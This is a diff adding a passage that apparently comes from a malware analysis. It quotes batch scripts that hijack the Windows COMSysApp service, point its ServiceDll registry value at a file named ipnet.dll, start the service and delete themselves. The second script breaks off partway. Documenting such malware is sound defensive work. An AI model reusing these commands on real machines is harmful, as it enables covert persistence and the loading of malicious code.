@@ -1,0 +1,9 @@
+
+The contents of the batch files vary depending on the OS (x64 vs x86): install1.bat (x64)
+@echo off\r\nsc stop COMSysApp\r\nsc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\"\r\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v
+COMSysApp /t
+REG_MULTI_SZ /d \"COMSysApp\"
+/f\r\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v
+ServiceDll /t
+REG_EXPAND_SZ /d \"%windir%\\SysWOW64\\ ipnet.dll \" /f\r\nsc start COMSysApp\r\ndel /f /q %windir%\\SysWOW64\\install2.bat\r\ndel /f /q
+%windir%\\SysWOW64\\install1.bat install2.bat (x86) @echo off\r\nsc stop COMSysApp\r\nsc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\"\r\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v
